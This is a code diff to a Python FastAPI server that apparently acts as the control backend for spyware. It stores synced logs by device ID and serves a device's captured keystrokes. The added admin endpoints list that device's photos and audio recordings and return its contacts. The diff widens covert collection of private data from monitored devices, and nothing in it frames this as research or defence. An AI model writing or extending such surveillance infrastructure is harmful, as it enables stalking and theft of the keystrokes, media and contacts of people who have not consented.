@@ -66,11 +66,12 @@ manager = ConnectionManager()
 @app.post("/api/sync-logs")
 async def sync_logs(request: Request):
     data = await request.json()
+    device_id = data.get("device_id", "unknown")
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"logs_{timestamp}.json"
+    filename = f"logs_{device_id}_{timestamp}.json"
     with open(os.path.join(LOGS_DIR, filename), "w") as f:
         json.dump(data, f, indent=4)
-    logger.info(f"Received logs: {filename}")
+    logger.info(f"Received logs from {device_id}")
     return {"status": "success"}
 
 @app.post("/api/sync-media")
@@ -159,16 +160,34 @@ async def receive_alert(alert: str = Form(...), type: str = Form(...)):
 async def get_keystrokes(device_id: str):
     try:
         files = [f for f in os.listdir(KEYSTROKES_DIR) if f.startswith(f"keys_{device_id}")]
-        files.sort(reverse=True) # Les plus récents en premier
-        
+        files.sort(reverse=True)
         all_content = []
-        for file in files[:5]: # Lire les 5 derniers fichiers
+        for file in files[:10]:
             with open(os.path.join(KEYSTROKES_DIR, file), "r") as f:
                 all_content.append(json.load(f))
-        
         return {"status": "success", "data": all_content}
     except Exception as e:
         return {"status": "error", "message": str(e)}
+
+@app.get("/admin/photos/{device_id}")
+async def list_photos(device_id: str):
+    files = [f for f in os.listdir(PHOTOS_DIR) if f.startswith(f"photo_{device_id}")]
+    files.sort(reverse=True)
+    return {"status": "success", "photos": files}
+
+@app.get("/admin/audio/{device_id}")
+async def list_audio(device_id: str):
+    files = [f for f in os.listdir(AUDIO_DIR) if f.startswith(f"audio_{device_id}")]
+    files.sort(reverse=True)
+    return {"status": "success", "audios": files}
+
+@app.get("/admin/contacts/{device_id}")
+async def get_contacts(device_id: str):
+    files = [f for f in os.listdir(CONTACTS_DIR) if f.startswith(f"contacts_{device_id}")]
+    if not files: return {"status": "error", "message": "No contacts found"}
+    files.sort(reverse=True)
+    with open(os.path.join(CONTACTS_DIR, files[0]), "r") as f:
+        return {"status": "success", "data": json.load(f)}
 
 @app.websocket("/ws/{device_id}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str):
